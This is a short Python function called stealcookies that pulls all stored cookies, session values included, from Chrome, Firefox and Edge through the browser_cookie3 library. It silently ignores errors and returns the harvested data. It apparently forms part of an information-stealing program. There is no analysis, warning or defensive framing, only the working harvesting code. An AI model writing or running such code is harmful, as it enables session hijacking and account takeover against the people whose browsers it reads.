def stealcookies():
    cookies = []
    
    try:
        chrome_cookies = browser_cookie3.chrome()
        for cookie in chrome_cookies:
            cookies.append({
                'browser': 'Chrome',
                'domain': cookie.domain,
                'name': cookie.name,
                'value': cookie.value
            })
    except:
        pass
    
    try:
        firefox_cookies = browser_cookie3.firefox()
        for cookie in firefox_cookies:
            cookies.append({
                'browser': 'Firefox',
                'domain': cookie.domain,
                'name': cookie.name,
                'value': cookie.value
            })
    except:
        pass
    
    try:
        edge_cookies = browser_cookie3.edge()
        for cookie in edge_cookies:
            cookies.append({
                'browser': 'Edge',
                'domain': cookie.domain,
                'name': cookie.name,
                'value': cookie.value
            })
    except:
        pass
    
    return cookies
